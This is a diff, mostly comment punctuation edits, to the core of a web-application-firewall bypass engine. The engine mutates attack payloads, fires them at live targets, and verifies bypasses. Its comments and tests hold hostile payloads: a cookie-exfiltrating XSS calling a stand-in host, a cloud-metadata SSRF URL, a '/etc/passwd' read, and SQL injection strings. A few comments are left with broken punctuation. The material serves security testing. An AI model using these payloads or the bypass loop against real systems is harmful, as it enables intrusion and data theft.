@@ -1,9 +1,9 @@
-//! The B→C→A equivalence moat — the *single source* of the
+//! The B→C→A equivalence moat, the *single source* of the
 //! sound-by-construction `(payload × delivery)` engine, the per-class
 //! `verified_bypass` oracle, and the CEGIS learned-WAF-boundary loop.
 //!
 //! Both the corpus bench (`bench_waf`) and the live product
-//! (`scan::run_scan`) drive the **same** engine through here — bench
+//! (`scan::run_scan`) drive the **same** engine through here, bench
 //! injects an httpbin-testbed request builder, scan injects a
 //! live-target builder. There is exactly one copy of the loop, one
 //! copy of the oracle, one model-persistence path: a fix here fixes
@@ -24,14 +24,14 @@ use wafrift_types::{Method, Request};
 
 // ───────────────────────── verified-bypass oracle ─────────────────────────
 //
-// AUTHORITATIVE. `bench_waf` and `scan` both `use` these — the
+// AUTHORITATIVE. `bench_waf` and `scan` both `use` these, the
 // anti-rig definition of "bypass" lives in exactly one place.
 
 /// A status that means the request actually reached and was processed
 /// by the origin app. A 400/413/502 is the evasion *breaking* the
-/// request — the attack never ran — so it is NOT a reached app. 5xx
+/// request, the attack never ran, so it is NOT a reached app. 5xx
 /// app errors (500) are kept: a SQL error page is frequently *positive*
-/// evidence of injection — our payload hit the query.
+/// evidence of injection (our payload hit the query).
 #[must_use]
 pub(crate) fn request_reached_app(status: u16) -> bool {
     matches!(
@@ -59,7 +59,7 @@ pub(crate) fn verified_bypass(
 /// Differential-baseline gate over [`verified_bypass`].
 ///
 /// A variant is credited as a bypass only when the standard oracle
-/// confirms it (`verified`) AND — when differential mode is on — the
+/// confirms it (`verified`) AND, when differential mode is on, the
 /// UN-EVADED base payload was BLOCKED in the same delivery (`base_blocked`).
 ///
 /// This closes the inflation behind "real payloads struggle vs. what we
@@ -69,7 +69,7 @@ pub(crate) fn verified_bypass(
 /// base to be blocked proves the evasion is what passed the variant.
 ///
 /// With differential OFF, callers pass `base_blocked = true`, so this is
-/// exactly `verified` — the headline metric is unchanged (anti-rig §12).
+/// exactly `verified`: the headline metric is unchanged (anti-rig §12).
 #[must_use]
 pub(crate) fn differential_confirmed(
     verified: bool,
@@ -84,16 +84,16 @@ pub(crate) fn differential_confirmed(
 /// corresponding `wafrift-oracle`).
 ///
 /// `cve_pocs`: the original payloads are verified exploits from public
-/// CVE advisories — their semantic validity is the CVE itself, but
+/// CVE advisories, their semantic validity is the CVE itself, but
 /// wafrift has no per-CVE oracle to confirm a mutation preserves the
 /// exploit. So we accept a `cve_pocs` variant ONLY when it equals the
 /// original (intact transmission). A mutated `cve_pocs` payload is
-/// REFUSED — anti-rig (LAW 1): never claim validity we can't prove.
+/// REFUSED (anti-rig (LAW 1): never claim validity we can't prove).
 ///
 /// Unknown class: refuse to validate. The old behaviour was a
 /// permissive `_ => true` fall-through which inflated bypass counts
 /// every time a new class slipped past the match without an oracle.
-/// Returning `false` makes the gap loud — the bench/scan will
+/// Returning `false` makes the gap loud, the bench/scan will
 /// honestly drop unverifiable bypasses until an oracle is wired.
 #[must_use]
 pub(crate) fn oracle_valid(class: &str, original: &str, transformed: &str) -> bool {
@@ -102,7 +102,7 @@ pub(crate) fn oracle_valid(class: &str, original: &str, transformed: &str) -> bo
         // (structural-token / mechanism preservation via `still_executes`) AND
         // that it still parses as a valid injection. Pre-fix this branch only
         // ran `is_valid_expression_injection(transformed, …)`, dropping
-        // `original` entirely — so a boolean tautology (`1 OR 1=1-- -`) was
+        // `original` entirely, so a boolean tautology (`1 OR 1=1-- -`) was
         // rubber-stamped as an "equivalent" bypass of a UNION data-exfil
         // original, even though it executes a different, weaker attack. That
         // violated this fn's own contract ("retains the exploit semantics of
@@ -116,7 +116,7 @@ pub(crate) fn oracle_valid(class: &str, original: &str, transformed: &str) -> bo
                 && sql_oracle::is_valid_expression_injection(transformed, DatabaseDialect::Generic)
         }
         // xss/cmdi/ssti/path/ldap/ssrf each route through their
-        // `grammar::equiv` SAME-EXPLOIT predicate — the canonical gate that
+        // `grammar::equiv` SAME-EXPLOIT predicate, the canonical gate that
         // (a) consults `original`, so it proves "is the *same* attack", not the
         // weaker "is *some* valid attack", and (b) already carries its own
         // structural guard on the candidate (`has_exec_context` for xss,
@@ -127,16 +127,16 @@ pub(crate) fn oracle_valid(class: &str, original: &str, transformed: &str) -> bo
         //
         // Pre-fix these six ran ONLY the structural `*Oracle.is_semantically_
         // valid`, and FIVE of those oracles ignore `original` entirely
-        // (`fn is_semantically_valid(_original, …)`) — so a minimizer driven by
+        // (`fn is_semantically_valid(_original, …)`), so a minimizer driven by
         // this gate could collapse an AWS-metadata SSRF
         // (`http://169.254.169.254/latest/meta-data/…`) down to
         // `http://127.0.0.1/`, or a cookie-exfil XSS
         // (`<svg onload=fetch('//e/'+document.cookie)>`) down to
-        // `<svg onload=alert(1)>` — both "valid" but a DIFFERENT attack.
+        // `<svg onload=alert(1)>`: both "valid" but a DIFFERENT attack.
         //
         // NOTE the oracle is intentionally NOT kept as a second `&&` gate: it
         // is both unnecessary (the equiv predicate's own structural guard is
-        // the backstop) AND actively harmful here — e.g. `XssOracle` is
+        // the backstop) AND actively harmful here, e.g. `XssOracle` is
         // alert/confirm/prompt-centric and reports a real `fetch()`/
         // `document.cookie` exfil as "not valid XSS", which would false-fail a
         // legitimate finding's identity check and silently demote distill to
@@ -160,7 +160,7 @@ pub(crate) fn oracle_valid(class: &str, original: &str, transformed: &str) -> bo
 /// `NoSQL` validity: the variant must express the SAME MongoDB
 /// operator-injection (operator + operand) as the original. Delegates
 /// to the RFC-8259-grounded equivalence predicate (anti-rig: a marker
-/// match alone — the old behaviour — let a mangled/broken payload
+/// match alone, the old behaviour, let a mangled/broken payload
 /// score as a bypass; `still_injects` rejects an operator/operand
 /// swap).
 #[must_use]
@@ -170,7 +170,7 @@ pub(crate) fn is_valid_nosql(original: &str, transformed: &str) -> bool {
 
 /// XXE validity: the variant must still make the parser fetch the SAME
 /// external resource(s) as the original (external-id equivalence).
-/// `still_exfils` rejects a target-URI swap — the marker-only check it
+/// `still_exfils` rejects a target-URI swap, the marker-only check it
 /// replaces did not.
 #[must_use]
 pub(crate) fn is_valid_xxe(original: &str, transformed: &str) -> bool {
@@ -179,7 +179,7 @@ pub(crate) fn is_valid_xxe(original: &str, transformed: &str) -> bool {
 
 /// `Log4Shell` validity: the variant must drive the SAME JNDI fetch
 /// (protocol + authority + path) after Log4j lookup-collapse.
-/// `still_executes` rejects a protocol/host swap — the substring check
+/// `still_executes` rejects a protocol/host swap, the substring check
 /// it replaces did not.
 #[must_use]
 pub(crate) fn is_valid_log4shell(original: &str, transformed: &str) -> bool {
@@ -202,8 +202,8 @@ pub(crate) fn class_for_payload_type(pt: PayloadType) -> Option<&'static str> {
         // three now have a SAME-EXPLOIT arm in `oracle_valid` (ssrf via
         // `still_targets`, nosql via `still_injects`, log4shell via
         // `still_executes`). Pre-fix they fell through to `None`, so
-        // `--class auto` silently dropped the most consequential payloads —
-        // including the canonical Log4Shell string — to the WAF-only gate even
+        // `--class auto` silently dropped the most consequential payloads 
+        // including the canonical Log4Shell string, to the WAF-only gate even
         // though a sound oracle existed. `Jndi` maps to the `"log4shell"`
         // oracle key (the class name in `oracle_valid`/`supports_class`).
         PayloadType::Ssrf => "ssrf",
@@ -212,7 +212,7 @@ pub(crate) fn class_for_payload_type(pt: PayloadType) -> Option<&'static str> {
         // `Ssi` is deliberately absent: `oracle_valid` has no `ssi` arm, so
         // there is no sound model to route to (anti-rig: never guess). `Xxe`
         // has no `PayloadType` variant (XML payloads aren't string-classified)
-        // — it is reachable only via explicit `--class xxe`.
+        //: it is reachable only via explicit `--class xxe`.
         _ => return None,
     };
     grammar::equiv::supports_class(c).then_some(c)
@@ -241,7 +241,7 @@ pub(crate) fn json_escape(s: &str) -> String {
 /// Translate an equivalence `DeliveryShape` into a concrete request
 /// against the **httpbin-backed WAF testbed** (`/get`, `/post`,
 /// `/anything/…`). Used by the corpus bench. Behaviour is pinned by
-/// `bench_waf::tests::delivery_shapes_build_correct_requests` — do not
+/// `bench_waf::tests::delivery_shapes_build_correct_requests`: do not
 /// alter the shapes.
 #[must_use]
 pub(crate) fn build_request_for_delivery(
@@ -279,7 +279,7 @@ pub(crate) fn build_request_for_delivery(
         // Multipart structural fields (name / filename / part_ct) need the
         // same CR/LF/NUL/quote strip + boundary-collision guard the live
         // renderer applies. Single-source via grammar's `to_request` so the
-        // testbed builder can't drift from it or silently skip the strip — a
+        // testbed builder can't drift from it or silently skip the strip, a
         // corpus-deserialized shape re-fired by `wafrift harvest` is built
         // HERE, so the sanitization must not be testbed-absent. Posts to /post.
         D::MultipartField { .. } | D::MultipartFile { .. } | D::Utf7MultipartField { .. } => {
@@ -300,7 +300,7 @@ pub(crate) fn build_request_for_delivery(
         // (CR/LF/NUL/`;` strip) is not re-implemented here.
         D::HeaderValue { .. } => d.to_request(&format!("{b}/headers"), payload),
         D::Cookie { .. } => d.to_request(&format!("{b}/cookies"), payload),
-        // Body-channel shapes — single-source via grammar's renderer
+        // Body-channel shapes, single-source via grammar's renderer
         // (XML escape, nested JSON, GraphQL envelope, JSON-unicode body).
         D::XmlBody { .. }
         | D::JsonNestedDeep { .. }
@@ -313,17 +313,17 @@ pub(crate) fn build_request_for_delivery(
 // `(payload × delivery)` URL rendering is now single-sourced in
 // `wafrift_grammar::grammar::equiv::DeliveryShape::to_request` (the
 // live path delegates to it). These cli-local copies were pre-refactor
-// duplicates with no remaining callers — the capability lives in
+// duplicates with no remaining callers, the capability lives in
 // grammar, so this is dead-duplicate cleanup, not a capability drop.
 
 /// Translate an equivalence `DeliveryShape` into a concrete request
-/// against the **live operator-supplied target** (a real URL) — the
+/// against the **live operator-supplied target** (a real URL), the
 /// shipped `wafrift scan` path. Same joint algebra as the testbed
 /// builder, but every shape hits the *actual* endpoint instead of
 /// httpbin routes. The shape already carries the operator's parameter
 /// name (the generator builds shapes from `cfg.param`, which
 /// `run_equiv_cegis` threads from the scan's `--param`), so there is
-/// no separate `param` argument — it would be a second, ignored,
+/// no separate `param` argument, it would be a second, ignored,
 /// source of truth.
 #[must_use]
 pub(crate) fn build_live_request_for_delivery(
@@ -337,7 +337,7 @@ pub(crate) fn build_live_request_for_delivery(
     d.to_request(target, payload)
 }
 
-/// Full response envelope returned by [`send_with_envelope`] — gives
+/// Full response envelope returned by [`send_with_envelope`], gives
 /// downstream consumers (corpus recorder, CF oracle, edge-POP coverage
 /// map) the headers and body they need to attribute the verdict.
 ///
@@ -353,14 +353,14 @@ pub(crate) struct ProbeEnvelope {
     /// by reqwest. Name is lowercased on the wire; we preserve it
     /// verbatim so callers can pattern-match on case as the WAF saw it.
     /// Read by `CorpusRecorder::record → parse_cf_block`. R70 pass-21:
-    /// removed `#[allow(dead_code)]` — the field IS read in production
+    /// removed `#[allow(dead_code)]`: the field IS read in production
     /// (corpus_recorder.rs), so the lint was a false suppression
     /// hiding the LAW 1 signal that would fire if the recorder ever
     /// stopped consuming this field.
     pub(crate) headers: Vec<(String, String)>,
     /// Response body bytes (bounded by `safe_body::DEFAULT_MAX_RESPONSE_BYTES`).
     /// Read by `CorpusRecorder::record → parse_cf_block + fnv1a_64`. R70
-    /// pass-21: see headers field above — `#[allow(dead_code)]` removed.
+    /// pass-21: see headers field above: `#[allow(dead_code)]` removed.
     pub(crate) body: Vec<u8>,
     /// Same `is_waf_block` signal `send()` returns.
     pub(crate) blocked: bool,
@@ -373,11 +373,11 @@ pub(crate) struct ProbeEnvelope {
 /// (`HeaderValue::from_str`) rejects. High-byte evasion payloads
 /// (overlong UTF-8, raw bytes) are *legal* header values, but routing
 /// them through `&str` made the whole membership query fail as a deferred
-/// "builder error" — silently dropping that L* learning signal (observed
+/// "builder error", silently dropping that L* learning signal (observed
 /// flooding the cumulus hunt; CLAUDE.md §13 dogfood). Only NUL / CR / LF
 /// are genuinely illegal in an HTTP header value, so returning `Err` for
 /// those (the learn loop then excludes them from the sample) is correct,
-/// not a missed bypass — a real client can't send them either.
+/// not a missed bypass (a real client can't send them either).
 fn header_value_from_payload(v: &str) -> Result<reqwest::header::HeaderValue, String> {
     reqwest::header::HeaderValue::from_bytes(v.as_bytes())
         .map_err(|_| "undeliverable header value (NUL/CR/LF illegal in HTTP headers)".to_string())
@@ -411,7 +411,7 @@ pub(crate) async fn send_with_envelope(
         // failing the entire membership query as a "builder error" and
         // starving the L* model. Build via `from_bytes` so they send; only
         // genuinely-illegal NUL/CR/LF are skipped (undeliverable by
-        // construction — see `header_value_from_payload`).
+        // construction (see `header_value_from_payload`)).
         let value = header_value_from_payload(v)?;
         builder = builder.header(k.as_str(), value);
     }
@@ -424,7 +424,7 @@ pub(crate) async fn send_with_envelope(
         .await
         .map_err(|e| crate::helpers::walk_reqwest_error(&e))?;
     let status = resp.status().as_u16();
-    // Snapshot headers BEFORE consuming the body — reqwest::Response
+    // Snapshot headers BEFORE consuming the body, reqwest::Response
     // moves the body but headers are clonable.
     let headers: Vec<(String, String)> = resp
         .headers()
@@ -437,7 +437,7 @@ pub(crate) async fn send_with_envelope(
             (k.as_str().to_string(), value)
         })
         .collect();
-    // Bounded read — decompression-bomb defence on the WAF response.
+    // Bounded read (decompression-bomb defence on the WAF response).
     let body = crate::safe_body::read_bounded(resp, crate::safe_body::DEFAULT_MAX_RESPONSE_BYTES)
         .await
         .map_err(|e| e.to_string())?;
@@ -485,14 +485,14 @@ pub(crate) struct EquivBypass {
     /// `"learn"` (Phase-C diverse probe) or `"cegis"` (Phase-A
     /// synthesized counterexample-guided probe).
     pub(crate) phase: &'static str,
-    /// Full response envelope from the confirming probe — the headers +
+    /// Full response envelope from the confirming probe, the headers +
     /// body that `CorpusRecorder::record → parse_cf_block` needs for CF
     /// rule + edge-POP attribution. Lets bench/hunt persist the winning
     /// payload with full evidence instead of `status` alone.
     pub(crate) envelope: ProbeEnvelope,
 }
 
-// AUDIT (legendary pass): anti-rig chain verified sound end-to-end —
+// AUDIT (legendary pass): anti-rig chain verified sound end-to-end 
 // send → is_waf_block (canonical FP-cheap classifier) → verified_bypass
 // (3 gates) → oracle_valid (parser-grounded). EquivOutcome counts ONLY
 // verified bypasses; `unverified_not_blocked` surfaces WAF-slips that
@@ -506,7 +506,7 @@ pub(crate) struct EquivOutcome {
     /// Requests fired (== variants; kept distinct for clarity).
     pub(crate) sends: usize,
     /// Slipped the WAF but failed an independent gate (NOT counted as
-    /// a bypass — surfaced for honesty/triage).
+    /// a bypass (surfaced for honesty/triage)).
     pub(crate) unverified_not_blocked: usize,
     /// Members that passed all three `verified_bypass` gates.
     pub(crate) bypasses: Vec<EquivBypass>,
@@ -516,16 +516,16 @@ pub(crate) struct EquivOutcome {
 
 /// Run the full B→C→A moat for one `(class, payload)`:
 ///
-/// * **B** — draw a diverse, round-robin-by-delivery-arm pool of
+/// * **B**: draw a diverse, round-robin-by-delivery-arm pool of
 ///   sound-by-construction equivalence members.
-/// * **A (warm start)** — load the boundary learned for THIS WAF on a
+/// * **A (warm start)**: load the boundary learned for THIS WAF on a
 ///   previous engagement; order the learn probes by predicted-allow so
 ///   even learning sends bypass sooner (the compounding asset).
-/// * **C/A** — learn an averaged-perceptron WAF boundary from probe
+/// * **C/A**: learn an averaged-perceptron WAF boundary from probe
 ///   verdicts, then CEGIS-synthesize the min-predicted-block unseen
 ///   member, confirm, refit on every counterexample.
 ///
-/// `build` is the request constructor — the testbed builder for the
+/// `build` is the request constructor, the testbed builder for the
 /// corpus bench, the live builder for `wafrift scan`. One loop, two
 /// callers: the moat the bench measures IS the moat the product ships.
 #[allow(clippy::too_many_arguments)]
@@ -634,7 +634,7 @@ where
     // spammed stderr with N copies of the same builder-error string
     // when a payload character family broke header construction
     // repeatedly. Aggregate by the error's display string and emit a
-    // single "N×: <error>" summary at function exit — same root-
+    // single "N×: <error>" summary at function exit, same root-
     // cause information, zero noise.
     let mut error_tally: std::collections::HashMap<String, usize> =
         std::collections::HashMap::new();
@@ -676,7 +676,7 @@ where
     // Differential-baseline pre-probe (anti-rig §12). When enabled, fire the
     // UN-EVADED base payload once per delivery arm and record whether the WAF
     // BLOCKS it. A variant is then credited as a bypass only if its arm's base
-    // was blocked — i.e. the evasion is what passed it, not a payload the WAF
+    // was blocked, i.e. the evasion is what passed it, not a payload the WAF
     // never policed (the `; id` / `//0/`-return-200 inflation). These probes
     // are verification overhead: they do NOT count toward `out.variants` or the
     // fire budget (`sends`), so the variant metric is unchanged. With
@@ -713,7 +713,7 @@ where
     let mpath = grammar::equiv::wafmodel::model_path(&model_dir, &fp);
     let prior = WafModel::load(&mpath).filter(|m| m.n > 0);
 
-    // Phase 1: learn — probe a round-robin-by-arm diverse subset.
+    // Phase 1: learn (probe a round-robin-by-arm diverse subset).
     let mut order: Vec<usize> = Vec::new();
     {
         let mut by_arm: Vec<Vec<usize>> = vec![Vec::new(); arms];
@@ -781,7 +781,7 @@ where
             Err(e) => {
                 // §7 forward-progress: a fired-but-errored candidate yields no
                 // usable signal, and `synthesize`/the fixed `order` are
-                // deterministic — so it must still be marked `tried` or it can
+                // deterministic, so it must still be marked `tried` or it can
                 // be re-selected. Here the learn phase walks a fixed `order` so
                 // it cannot spin, but recording it prevents the CEGIS phase
                 // below from re-firing a candidate that already failed in learn.
@@ -793,7 +793,7 @@ where
         }
     }
 
-    // Phase 2: CEGIS — synthesize, confirm, refit on counterexample.
+    // Phase 2: CEGIS (synthesize, confirm, refit on counterexample).
     let mut model = prior
         .clone()
         .unwrap_or_else(|| WafModel::learn(&samples, 30));
@@ -844,7 +844,7 @@ where
                 // errored candidate is left out of `tried`, the next iteration
                 // re-synthesizes the IDENTICAL candidate, re-fires the same
                 // failing request, and burns the entire remaining fire budget
-                // on one dead candidate — never exploring the rest of the pool.
+                // on one dead candidate (never exploring the rest of the pool).
                 // Mark it tried so synthesis advances to the next-best unseen
                 // candidate.
                 tried.insert((pp.clone(), aa));
@@ -865,7 +865,7 @@ where
         }
     }
     out.sends = sends;
-    // Emit the aggregated error tally — at most one line per
+    // Emit the aggregated error tally, at most one line per
     // distinct error string regardless of how many times each fired.
     if !error_tally.is_empty() {
         let mut rows: Vec<(String, usize)> = error_tally.into_iter().collect();
@@ -887,17 +887,17 @@ mod tests {
     use grammar::equiv::DeliveryShape as D;
 
     /// §13 dogfood (cumulus): obs-text (high-byte) payloads are LEGAL
-    /// HTTP header values (RFC 7230) — they must form real membership
+    /// HTTP header values (RFC 7230), they must form real membership
     /// queries, not die as "builder errors". Only NUL/CR/LF are illegal
     /// and correctly excluded from the L* sample.
     #[test]
     fn header_value_accepts_obs_text_rejects_control_bytes() {
-        // High bytes (overlong-UTF-8 / raw-byte evasion) — sendable.
+        // High bytes (overlong-UTF-8 / raw-byte evasion) (sendable).
         assert!(header_value_from_payload("caf\u{e9}").is_ok());
         assert!(header_value_from_payload("\u{ff}\u{fe}admin").is_ok());
-        // Ordinary attack payloads — sendable.
+        // Ordinary attack payloads (sendable).
         assert!(header_value_from_payload("' OR 1=1-- -").is_ok());
-        // NUL / CR / LF — genuinely un-sendable over HTTP; excluding them
+        // NUL / CR / LF, genuinely un-sendable over HTTP; excluding them
         // from the sample is correct, not a missed bypass.
         assert!(header_value_from_payload("x\r\ny").is_err());
         assert!(header_value_from_payload("x\nINJECT: evil").is_err());
@@ -1054,7 +1054,7 @@ mod tests {
         // Numeric-context SQL oracle: `1 OR 1=1` is parseable as an
         // expression injection. With original == transformed the
         // `still_executes` same-attack gate trivially holds (identity is
-        // equivalent), and the parse check passes — so an intact tautology
+        // equivalent), and the parse check passes, so an intact tautology
         // is still credited.
         assert!(oracle_valid("sql", "1 OR 1=1", "1 OR 1=1"));
     }
@@ -1065,8 +1065,8 @@ mod tests {
         // structured UNION data-exfil attack; the candidate is a boolean
         // tautology. The tautology IS valid SQLi
         // (`is_valid_expression_injection` returns true for it), so the
-        // PRE-FIX `oracle_valid` — which only checked the transformed string
-        // and dropped `original` — wrongly credited it as an "equivalent"
+        // PRE-FIX `oracle_valid`: which only checked the transformed string
+        // and dropped `original`: wrongly credited it as an "equivalent"
         // bypass of the exfil. But a tautology does not exfiltrate the card
         // data: it is a different, weaker attack. The fix requires
         // `still_executes(original, transformed)` too, so the structured
@@ -1107,13 +1107,13 @@ mod tests {
         // blocked `Ok`. So if a fired-but-errored candidate is left out of
         // `tried`, the next loop iteration re-synthesizes the IDENTICAL
         // candidate, re-fires the same failing request, and spins until the
-        // whole budget is gone — one dead candidate starves the entire pool.
+        // whole budget is gone (one dead candidate starves the entire pool).
         //
         // Drive the real engine at a closed loopback port so EVERY send errors
         // (connection refused). Pre-fix: the CEGIS `while sends < budget` loop
         // runs to completion, so `out.sends == budget`. Post-fix: each errored
         // candidate is marked `tried`, synthesis advances, and once the pool is
-        // exhausted `synthesize` returns `None` and the loop breaks — so
+        // exhausted `synthesize` returns `None` and the loop breaks, so
         // `out.sends` is bounded by the (small) candidate pool, far under the
         // budget. Reverting either `tried.insert` in an `Err` arm turns this
         // red (sends jumps back to `budget`).
@@ -1144,13 +1144,13 @@ mod tests {
         // No `Ok` response ever arrived, so nothing can be credited a bypass.
         assert!(
             out.bypasses.is_empty(),
-            "all sends errored — no bypass is provable"
+            "all sends errored, no bypass is provable"
         );
         // The candidate pool (arms × per-arm, post-dedup) is dozens of entries,
         // nowhere near 500. A budget-burn would show as sends == budget.
         assert!(
             out.sends < budget,
-            "CEGIS fired {}/{} requests — it re-fired one errored candidate to \
+            "CEGIS fired {}/{} requests, it re-fired one errored candidate to \
              budget exhaustion instead of advancing (Err arm forgot tried.insert)",
             out.sends,
             budget
@@ -1189,7 +1189,7 @@ mod tests {
 
     #[test]
     fn json_escape_passes_high_unicode_through_verbatim() {
-        // Anything ≥ 0x20 (printable) flows unchanged — including
+        // Anything ≥ 0x20 (printable) flows unchanged, including
         // multi-byte UTF-8. JSON spec permits unescaped non-ASCII
         // as long as it's valid UTF-8.
         assert_eq!(json_escape("café 中文"), "café 中文");
@@ -1218,7 +1218,7 @@ mod tests {
     fn class_for_payload_type_routes_ssrf_nosql_jndi_to_their_sound_oracles() {
         // `classify()` actively returns these three PayloadTypes, and each now
         // has a SAME-EXPLOIT arm in `oracle_valid`. The auto-classifier path
-        // (`--class auto`) MUST reach them — previously it dropped all three to
+        // (`--class auto`) MUST reach them, previously it dropped all three to
         // `None`, silently demoting `distill`/`tmin` to the WAF-only gate for
         // SSRF, NoSQL, and (most consequentially) Log4Shell payloads.
         assert_eq!(class_for_payload_type(PayloadType::Ssrf), Some("ssrf"));
@@ -1231,7 +1231,7 @@ mod tests {
     #[test]
     fn class_for_payload_type_ssi_still_none_no_sound_model() {
         // `oracle_valid` has no `ssi` arm, so there is nothing sound to route
-        // to — anti-rig: the mapping must NOT invent a class for it.
+        // to (anti-rig: the mapping must NOT invent a class for it).
         assert_eq!(class_for_payload_type(PayloadType::Ssi), None);
         assert_eq!(class_for_payload_type(PayloadType::Unknown), None);
     }
@@ -1247,7 +1247,7 @@ mod tests {
         let localhost = "http://127.0.0.1/";
         assert!(
             !oracle_valid("ssrf", metadata, localhost),
-            "target swap must be rejected — different connect target is a different attack"
+            "target swap must be rejected, different connect target is a different attack"
         );
         assert!(
             oracle_valid("ssrf", metadata, metadata),
@@ -1265,21 +1265,21 @@ mod tests {
         let benign = "<svg onload=alert(1)>";
         assert!(
             !oracle_valid("xss", exfil, benign),
-            "dropping the exfil sink changes the attack — must be rejected"
+            "dropping the exfil sink changes the attack, must be rejected"
         );
         assert!(oracle_valid("xss", exfil, exfil), "identity must hold");
     }
 
     #[test]
     fn oracle_valid_cmdi_rejects_swapping_the_command() {
-        // A `cat /etc/passwd` finding must not reduce to a bare `id` probe —
+        // A `cat /etc/passwd` finding must not reduce to a bare `id` probe 
         // different command, different finding. `still_executes_cmd` pins the
         // command verb + target as whole tokens.
         let read_passwd = "; cat /etc/passwd";
         let probe = "; id";
         assert!(
             !oracle_valid("cmdi", read_passwd, probe),
-            "swapping the executed command changes the attack — must be rejected"
+            "swapping the executed command changes the attack, must be rejected"
         );
         assert!(
             oracle_valid("cmdi", read_passwd, read_passwd),
@@ -1321,7 +1321,7 @@ mod tests {
     #[test]
     fn oracle_valid_cve_pocs_mutated_is_refused() {
         // A mutated cve_pocs payload has no oracle to confirm the
-        // exploit survives — pre-fix this returned `true` and inflated
+        // exploit survives, pre-fix this returned `true` and inflated
         // bypass counts.
         let original = "CVE-2024-XXXX exploit string";
         let mutated = "CVE-2024-XXXX exploit string ";
@@ -1331,7 +1331,7 @@ mod tests {
     #[test]
     fn oracle_valid_unknown_class_is_refused() {
         // Pre-fix: `_ => true` accepted anything for an unrecognised
-        // class. Post-fix: unknown class is refused — the bench/scan
+        // class. Post-fix: unknown class is refused, the bench/scan
         // will honestly drop the bypass rather than silently rig it.
         assert!(!oracle_valid("not_a_class", "a", "a"));
         assert!(!oracle_valid("", "", ""));
@@ -1346,7 +1346,7 @@ mod tests {
     fn verified_bypass_unknown_class_returns_false_even_when_gates_pass() {
         // The 3-gate oracle composes oracle_valid AND. With unknown
         // class refusing, even a clean (!blocked, 200) response is NOT
-        // a bypass — closes the rig where adding a new class without an
+        // a bypass, closes the rig where adding a new class without an
         // oracle silently counted every pass as success.
         assert!(!verified_bypass(
             "future_class_no_oracle",
@@ -1360,7 +1360,7 @@ mod tests {
     #[test]
     fn differential_off_is_identical_to_verified() {
         // Anti-rig: with differential OFF, the gate must equal `verified`
-        // for BOTH truth values — the headline metric is unchanged.
+        // for BOTH truth values (the headline metric is unchanged).
         assert!(differential_confirmed(true, false, false));
         assert!(differential_confirmed(true, false, true));
         assert!(!differential_confirmed(false, false, true));
@@ -1385,7 +1385,7 @@ mod tests {
     }
 
     /// Exhaustive property over ALL 8 (verified, differential, base_blocked)
-    /// combinations — the gate's full truth table, derived independently of
+    /// combinations, the gate's full truth table, derived independently of
     /// the implementation expression:
     ///   * differential = false  ⇒ result == verified (base_blocked ignored)
     ///   * differential = true   ⇒ result == (verified && base_blocked)
